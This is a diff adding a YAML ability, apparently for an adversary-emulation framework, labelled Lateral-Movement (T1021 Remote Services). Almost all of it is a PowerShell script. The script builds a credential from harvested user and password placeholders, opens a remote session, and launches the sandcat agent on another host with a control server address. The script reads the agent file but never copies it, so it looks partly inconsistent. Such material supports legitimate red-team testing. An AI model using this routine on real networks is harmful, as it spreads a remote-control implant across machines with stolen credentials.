@@ -1,0 +1,22 @@
+---
+
+- id: 41bb2b7a-75af-49fd-bd15-6c827df25921
+  name: Start Agent
+  description: Start Agent
+  tactic: Lateral-Movement
+  technique:
+    attack_id: T1021
+    name: Remote Services
+  executors:
+    windows:
+      command: |
+        $username = "#{host.user.name}";
+        $password = "#{host.user.password}";
+        $secstr = New-Object -TypeName System.Security.SecureString;
+        $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+        $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+        $File = [System.IO.File]::ReadAllBytes("#{files}\sandcat.exe");
+        $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
+        Invoke-Command -ComputerName #{remote.host.ip} Start-Process -FilePath C:\Users\Public\sandcat.exe -ArgumentList "#{server} #{group}"
+
+      payload: sandcat.exe
